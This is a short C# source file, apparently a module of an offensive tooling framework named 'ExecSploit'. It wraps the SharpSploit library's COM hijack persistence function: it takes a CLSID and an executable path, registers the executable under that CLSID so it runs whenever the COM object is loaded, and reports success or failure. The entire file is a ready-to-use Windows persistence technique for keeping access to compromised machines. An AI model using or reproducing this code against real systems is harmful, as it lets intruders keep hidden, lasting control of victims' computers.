using System;

using SharpSploit.Persistence;

namespace ExecSploit
{
    public static class PersistCOMHijack
    {
        public static string Execute(string CLSID, string ExecutablePath)
        {
            if (COM.HijackCLSID(CLSID, ExecutablePath))
            {
                return "COM hijack succeeded for CLSID: " + CLSID + " with ExecutablePath: " + ExecutablePath;
            }
            return "COM hijack failed for CLSID: " + CLSID + " with ExecutablePath: " + ExecutablePath;
        }
    }
}